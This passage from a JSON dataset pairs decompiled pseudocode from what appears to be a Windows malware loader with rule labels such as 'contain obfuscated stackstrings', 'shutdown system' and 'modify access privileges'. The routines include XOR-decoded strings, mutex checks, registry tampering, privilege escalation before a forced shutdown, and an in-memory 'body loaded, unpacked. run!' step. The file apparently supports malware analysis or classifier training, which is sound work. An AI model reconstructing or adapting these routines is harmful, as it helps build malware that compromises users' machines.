        "token_count": 1049
    },
    "0040db94": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040db94(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t arg_8h_00;\n    uchar *puVar5;\n    uint *puVar6;\n    uchar auStack48 [4];\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    \n    puVar5 = auStack48;\n    for (iVar2 = 0x10; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    iVar4 = 0;\n    arg_8h_00 = 0;\n    uStack40 = arg_8h;\n    iVar2 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x43a, 0, arg_8h);\n    if (iVar2 != 0) {\n        puVar6 = &uStack44;\n        for (iVar3 = 0x18; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        uStack28 = 0x4400;\n        uStack44 = 0x4134a0;\n        uStack40 = 0;\n        uStack24 = 0x6200;\n        uStack36 = 0x4178a0;\n        uStack32 = 0;\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n        iVar3 = fcn.0040da45();\n        if (iVar3 != 0) {\n            iVar3 = fcn.0040da45();\n            arg_8h_00 = -(iVar3 != 0) & 0x10;\n        }\n        do {\n            iVar3 = fcn.0040c345(arg_8h_00);\n            if (iVar3 == 0) break;\n            (*_sym.imp.KERNEL32.dll_Sleep)(0x32);\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 0x14);\n        pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n        (*pcVar1)(iVar2);\n    }\n    return 0;\n}\n",
        "token_count": 552
    },
    "0040f8e7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open registry key"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040f8e7(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint var_16ch;\n    int32_t var_68h;\n    int32_t var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_35h;\n    uint var_31h;\n    uint var_2dh;\n    uint var_29h;\n    uint var_25h;\n    uint var_21h;\n    uint var_1dh;\n    uint var_19h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_60h = 0;\n    var_5ch = 0x4273629;\n    var_58h = 0x3c083624;\n    puVar6 = &var_16ch;\n    for (iVar4 = 0x104; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    var_54h = 0x343a3d1d;\n    var_50h = 0x1f323608;\n    var_4ch = 0xe262335;\n    var_48h = 0x38371e28;\n    var_44h = 0x331d2a0d;\n    var_40h = 0x3c082526;\n    var_3ch._0_2_ = 0x42f;\n    var_64h = 5;\n    var_3ch._2_1_ = 5;\n    stack0xffffffc3 = 0x282a0832;\n    var_35h = 0x330b3d1f;\n    var_31h = 0x21153537;\n    var_2dh = 0x612d1f39;\n    var_29h = 0xe233623;\n    var_25h = 0x20172f30;\n    var_21h = 0x2f36200b;\n    var_1dh = 0x5f0b2015;\n    var_19h._0_2_ = 0x1d3d;\n    var_19h._2_1_ = 0x70;\n    var_8h = 0x7041597a;\n    var_4h._0_2_ = 0x5753;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x47);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_ch = 6;\n    iVar5 = 0;\n    var_68h = iVar4;\n    do {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        if (iVar2 != 0x7a7701) {\n            *(iVar5 + iVar4) = *(&var_8h + iVar5 % var_ch) ^ (iVar5 + iVar4)[&var_5ch - iVar4];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x46);\n    var_14h = 0x445d00;\n    var_10h._0_1_ = 0x48;\n    var_8h = 0x30746832;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x48);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar5 = 0;\n    var_ch = &var_14h - iVar4;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        iVar2 = var_68h;\n        if (iVar3 != 0xc30f3d) {\n            *(iVar5 + iVar4) = *(&var_8h + iVar5 % var_64h) ^ (iVar5 + iVar4)[&var_14h - iVar4];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 5);\n    do {\n        iVar5 = 0;\n        do {\n            var_ch = 0;\n            (*_sym.imp.USER32.dll_wsprintfA)(&var_16ch, iVar2, iVar5);\n            iVar3 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyA)(0x80000001, &var_16ch, &var_ch);\n            if (iVar3 == 0) {\n                var_60h = 3;\n                (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(var_ch, iVar4, 0, 4, &var_60h, 4);\n                (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_ch);\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 5);\n        (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n    } while( true );\n}\n",
        "token_count": 1252
    },
    "0040fbd3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "delay execution",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid fcn.0040fbd3(void)\n\n{\n    char cVar1;\n    uint arglist;\n    int32_t iVar2;\n    uint noname_0;\n    uchar *puVar3;\n    uint uStack36;\n    uint auStack32 [2];\n    uchar auStack24 [8];\n    uchar auStack16 [12];\n    \n    puVar3 = auStack24;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    puVar3 = auStack16;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    do {\n        do {\n            cVar1 = fcn.00403dd2();\n        } while (cVar1 == '\\0');\n        iVar2 = fcn.0040ce8d(0);\n        if (iVar2 != 0) {\n            arglist = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)(0x45c);\n            fcn.00401f6b(\"<%d>: BODYSPAWNER.CPP:%d > LoadBodyFileIntoCurrentProcess : body loaded, unpacked. run!\", \n                         arglist);\n            auStack32[0] = 0;\n            uStack36 = 0;\n            fcn.0040d3e1();\n            fcn.0040a19a(noname_0, auStack32, &uStack36);\n            (*_sym.imp.KERNEL32.dll_Sleep)(0xffffffff);\n        }\n    } while( true );\n}\n",
        "token_count": 386
    },
    "0040221b": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid fcn.0040221b(void)\n\n{\n    int32_t iVar1;\n    \n    while( true ) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        if (iVar1 == 0) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)();\n    }\n    return;\n}\n",
        "token_count": 70
    },
    "0040577b": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nuint fcn.0040577b(void)\n\n{\n    int32_t iVar1;\n    \n    while( true ) {\n        iVar1 = fcn.00405161();\n        if (iVar1 != 0) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n    }\n    fcn.00405119();\n    return 0;\n}\n",
        "token_count": 79
    },
    "0040b381": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040b381(uint param_1)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint lpBuffer;\n    uint var_8h;\n    int32_t lpNumberOfBytesRead;\n    \n    var_8h = param_1;\n    do {\n        *0x41daa4 = 0;\n        iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileW)(param_1, 0x80000000, 3, 0, 3, 0, 0);\n        if (iVar2 != 0) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar2, &lpBuffer, 0x200, &lpNumberOfBytesRead, 0);\n            while ((iVar3 != 0 && (param_1 = var_8h,  lpNumberOfBytesRead != 0))) {\n                puVar4 = &lpBuffer;\n                iVar3 = lpNumberOfBytesRead;\n                do {\n                    uVar1 = *puVar4;\n                    puVar4 = puVar4 + 1;\n                    *0x41daa4 = *0x41daa4 >> 8 ^ *((uVar1 ^ *0x41daa4 & 0xff) * 4 + 0x4104f0) ^ 0xd202ef8d;\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != 0);\n                iVar3 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar2, &lpBuffer, 0x200, &lpNumberOfBytesRead, 0);\n                param_1 = var_8h;\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n            iVar2 = fcn.004044bb(0x41db88);\n            if (iVar2 == 0) {\n                return;\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n    } while( true );\n}\n",
        "token_count": 450
    },
    "0040207b": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.0040207b(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    code *pcVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint32_t var_36h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uchar var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    int32_t lpLibFileName;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_60h = 0xf01faf00;\n    var_5ch = 0x505600;\n    var_58h = 0x8002700;\n    var_54h = 0xc2900;\n    var_50h = 0x56900;\n    var_4ch = 0x3ff00;\n    var_48h = 0x1c4200;\n    var_44h = 0x163e00;\n    var_10h = 0;\n    var_28h._0_1_ = 2;\n    var_28h._1_1_ = 0x32;\n    var_28h._2_2_ = 0x319;\n    var_24h._0_2_ = 0x6436;\n    var_24h._2_2_ = 0x3e4c;\n    var_20h._0_2_ = 0xe3d;\n    var_20h._2_2_ = CONCAT11(var_20h._3_1_, 0x50);\n    var_18h = 0x515a6250;\n    var_14h._0_2_ = CONCAT11(var_14h._1_1_, 0x62);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar11 = 0;\n    var_8h = &var_28h - iVar5;\n    lpLibFileName = iVar5;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n        if (iVar6 != 0xfb98fe) {\n            var_4h = 5;\n            *(iVar11 + iVar5) = *(&var_18h + iVar11 % 5) ^ (iVar11 + iVar5)[var_8h];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0xb);\n    var_30h = 0x7593b0f;\n    var_2ch = 0x2f3f0a07;\n    var_28h._0_1_ = 0x44;\n    var_4h = 6;\n    var_28h._1_1_ = 6;\n    var_28h._2_2_ = 0x1d17;\n    var_24h._0_2_ = 0x3b2b;\n    var_24h._2_2_ = 0xd55;\n    var_20h._0_2_ = 0x1130;\n    var_20h._2_2_ = 0x223b;\n    var_1ch = 0x30;\n    var_18h = 0x63304e5a;\n    var_14h._0_2_ = 0x7844;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x16);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar11 = 0;\n    var_8h = &var_30h - iVar5;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_CreateMenu)();\n        iVar6 = lpLibFileName;\n        if (iVar7 != 0xc7e33b) {\n            *(iVar11 + iVar5) = *(&var_18h + iVar11 % var_4h) ^ (iVar11 + iVar5)[&var_30h - iVar5];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0x15);\n    uVar4 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar5);\n    pcVar8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4);\n    uVar10 = var_10h;\n    if (pcVar8 == NULL) {\n        uVar10 = 0;\n    }\n    else {\n        (*pcVar8)(&var_40h);\n        uVar3 = var_36h;\n        uVar2 = var_36h & 0xffffff;\n        var_36h = uVar2 | uVar10 << 0x18;\n        uVar9 = 0;\n        uVar1 = uVar10 & 0xff;\n        do {\n            if ((uVar1 | (uVar3 & 0xff0000) >> 8 | (uVar3 & 0xff00) << 8 | uVar2 << 0x18) == (&var_60h)[uVar9]) {\n                uVar10 = 1;\n            }\n            uVar9 = uVar9 + 1;\n        } while (uVar9 < 8);\n    }\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n    (*pcVar8)(uVar4);\n    return uVar10;\n}\n",
        "token_count": 1431
    },
    "00402fb9": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "create mutex",
            "check mutex and exit",
            "terminate process"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00402fb9(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_3ch = 0x5721423a;\n    var_38h = 0x4434694b;\n    var_34h = 0x420a393e;\n    var_30h = 0x697c5721;\n    var_2ch = 0x3923442c;\n    var_28h = 0x573d421b;\n    var_24h = 0x442d6969;\n    var_20h = 0x4207393e;\n    var_1ch = 0x696d5730;\n    var_18h = 0x3925442a;\n    var_14h = 0x5725420c;\n    var_10h = 0x4442695d;\n    var_ch = 0x57444269;\n    var_8h._0_1_ = 0x39;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x61);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar5 = 0;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n        if (iVar4 != 0x4fb422) {\n            var_4h = 5;\n            *(iVar5 + iVar3) = *(&var_ch + iVar5 % 5) ^ (iVar5 + iVar3)[&var_3ch - iVar3];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x30);\n    iVar5 = (*_sym.imp.KERNEL32.dll_OpenMutexW)(0x1f0001, 0, iVar3);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar5 == 0) {\n        (*_sym.imp.KERNEL32.dll_CreateMutexW)(0, 0, iVar3);\n        uVar2 = (*pcVar1)(0, iVar3);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        return;\n    }\n    (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 655
    },
    "00403722": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "set registry value"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00403722(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    uint var_4ch;\n    uint32_t var_48h;\n    uint8_t var_44h;\n    uint var_43h;\n    uint var_3fh;\n    uint var_39h;\n    uint var_35h;\n    uint var_31h;\n    uint var_2dh;\n    uint var_27h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint8_t *hKey;\n    int32_t var_ch;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_18h = *0x413440;\n    var_4ch = 0x640c6401;\n    var_ch = 5;\n    var_48h._0_1_ = 5;\n    stack0xffffffb5 = 0x13631052;\n    var_43h = 0x11643363;\n    var_3fh._0_1_ = 100;\n    var_14h = 6;\n    var_3fh._1_1_ = 6;\n    stack0xffffffbf = 0x29633852;\n    var_39h._0_1_ = 99;\n    var_39h._1_1_ = 0x3b;\n    var_39h._2_2_ = 100;\n    var_35h._0_2_ = 0x1164;\n    var_35h._2_2_ = 0xb52;\n    var_31h._0_2_ = 0x1763;\n    var_31h._2_2_ = 0x3d63;\n    var_2dh._0_1_ = 100;\n    stack0xffffffd1 = 0x64521764;\n    var_27h._0_1_ = 99;\n    stack0xffffffd8 = 0x64636452;\n    var_20h._0_2_ = CONCAT11(var_20h._1_1_, 99);\n    var_2dh._1_1_ = var_48h;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x4d);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar5 = 0;\n    var_1ch = iVar2;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetShellWindow)();\n        if (iVar3 != 0xbcdf1) {\n            *(iVar5 + iVar2) = *(&var_27h + iVar5 % var_ch + 3) ^ (iVar5 + iVar2)[&var_4ch - iVar2];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x26);\n    iVar5 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(hKey, iVar2, 0, 0xf003f, &var_4h);\n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar5 == 0) {\n        stack0xffffffb5 = stack0xffffffb5 & 0xffffff | 0x21000000;\n        var_43h = 0x1a624148;\n        var_3fh._0_1_ = 0x7a;\n        var_3fh._1_1_ = 0xe;\n        stack0xffffffbf = 0x7627948;\n        var_39h._0_1_ = 0x7a;\n        var_39h._1_1_ = 5;\n        var_39h._2_2_ = 0x7848;\n        var_35h._0_2_ = 0x962;\n        var_35h._2_2_ = 0x1a7a;\n        var_31h._0_2_ = 0x6648;\n        var_31h._2_2_ = 0x162;\n        var_2dh._0_1_ = 0x7a;\n        var_2dh._1_1_ = 0x18;\n        stack0xffffffd1 = 0x68625048;\n        var_27h._0_1_ = 0x7a;\n        stack0xffffffd8 = 0x62354862;\n        var_20h._0_2_ = 0x7a68;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x3d);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar5 = 0;\n        hKey = &var_44h + -iVar2;\n        do {\n            iVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n            if (iVar3 != 0x48d208) {\n                *(iVar5 + iVar2) = *(&var_27h + iVar5 % var_14h + 3) ^ (iVar5 + iVar2)[&var_44h + -iVar2];\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 0x1e);\n        (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(var_4h, iVar2, 0, 4, &var_18h, 4);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_4h);\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        iVar2 = var_1ch;\n    }\n    uVar1 = (*pcVar4)(0, iVar2);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    return;\n}\n",
        "token_count": 1375
    },
    "00404baa": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "shutdown system",
            "modify access privileges"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00404baa(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint NewState;\n    uint lpLuid;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint TokenHandle;\n    int32_t var_8h;\n    \n    var_38h = 0x3239273f;\n    var_34h = 0x2d082d1e;\n    var_30h = 0x2b3b341d;\n    var_2ch = 0x36033405;\n    var_28h = 0x42093e0e;\n    var_14h = 0x5a6a426c;\n    var_10h._0_2_ = 0x596b;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_8h = 6;\n    iVar6 = 0;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        if (iVar5 != 0x9aa0e1) {\n            *(iVar6 + iVar4) = *(&var_14h + iVar6 % var_8h) ^ (iVar6 + iVar4)[&var_38h - iVar4];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x14);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x28, &TokenHandle);\n    (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar3);\n    (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, iVar4, &lpLuid);\n    NewState = 1;\n    var_18h = 2;\n    (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &NewState, 0, 0, 0);\n    pcVar2 = _sym.imp.USER32.dll_ExitWindowsEx;\n    iVar6 = (*_sym.imp.USER32.dll_ExitWindowsEx)(6, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar6 == 0) {\n        (*pcVar2)(4, 0);\n    }\n    uVar3 = (*pcVar1)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return;\n}\n",
        "token_count": 644
    },
    "00405c8d": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "query environment variable"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00405c8d(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    uint lpString;\n    uint var_24h;\n    int32_t var_20h;\n    uint var_18h;\n    uint var_14h;\n    uint var_dh;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = 0x15301d00;\n    var_14h._0_2_ = 0x5d3d;\n    stack0xffffffeb = 0x3a193d00;\n    puVar5 = &lpString;\n    for (iVar4 = 0x104; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    var_20h = 6;\n    var_24h = 0;\n    var_14h._2_1_ = 6;\n    var_dh._0_2_ = 0x635f;\n    var_8h = 0x76516f63;\n    var_4h._0_2_ = 0x3056;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar6 = 0;\n    do {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n        if (iVar2 != 0x4d3278) {\n            *(iVar6 + iVar4) = *(&var_8h + iVar6 % var_20h) ^ (iVar6 + iVar4)[&var_18h - iVar4];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0xd);\n    iVar6 = (*_sym.imp.KERNEL32.dll_GetEnvironmentVariableA)(iVar4, &lpString, 0x104);\n    uVar1 = var_24h;\n    if (iVar6 != 0) {\n        (*_sym.imp.KERNEL32.dll_lstrlenA)(&lpString);\n        iVar6 = fcn.004057a4();\n        if (iVar6 == -0x69b4c9f2) {\n            uVar1 = 1;\n        }\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return uVar1;\n}\n",
        "token_count": 607
    },
    "004083b2": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.004083b2(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    int32_t iVar8;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_3fh;\n    uint var_3bh;\n    uint var_37h;\n    uint var_33h;\n    uint var_2fh;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = *0x413000;\n    var_14h = param_1;\n    if (*0x41db40 == NULL) {\n        var_4ch = 0x47135e1e;\n        var_48h = 0x50272245;\n        var_8h = 6;\n        var_44h._0_1_ = 6;\n        stack0xffffffb9 = 0x2630141d;\n        var_3fh = 0x37455246;\n        var_3bh = 0x541b14;\n        var_37h = 0x2a020318;\n        var_33h = 0x1f1e0d45;\n        var_2fh._0_1_ = 0x67;\n        var_1ch = 0x71643149;\n        var_18h._0_2_ = 0x6771;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1f);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar8 = 0;\n        var_10h = iVar4;\n        do {\n            iVar5 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n            if (iVar5 != 0xe98f43) {\n                *(iVar8 + iVar4) = *(&var_1ch + iVar8 % var_8h) ^ (iVar8 + iVar4)[&var_4ch - iVar4];\n            }\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < 0x1e);\n        stack0xffffffd0 = 0x342b1338;\n        var_28h = 0x4460070b;\n        var_24h = 0x7023e77;\n        var_20h._0_1_ = 0x53;\n        var_1ch = 0x5a597653;\n        var_18h._0_2_ = 0x6b6e;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar5 = 0;\n        iVar8 = &var_2fh + (3 - iVar4);\n        var_ch = iVar8;\n        do {\n            iVar6 = (*_sym.imp.USER32.dll_GetMessageTime)();\n            iVar2 = var_10h;\n            if (iVar6 != 0xac8272) {\n                *(iVar5 + iVar4) = *(&var_1ch + iVar5 % var_8h) ^ (iVar5 + iVar4)[iVar8];\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 0xd);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar4, var_10h);\n        *0x41db40 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n        pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*pcVar1)(0, iVar2);\n        (*pcVar7)(uVar3);\n        pcVar7 = *0x41db40;\n        if (*0x41db40 == NULL) goto code_r0x00408523;\n    }\n    iVar4 = var_14h;\n    pcVar7 = (**0x41db40)(var_14h);\n    if (pcVar7 != '\\0') {\n        *0x413000 = iVar4 != 0;\n    }\ncode_r0x00408523:\n    return pcVar7 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 1121
    },
    "0040d130": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
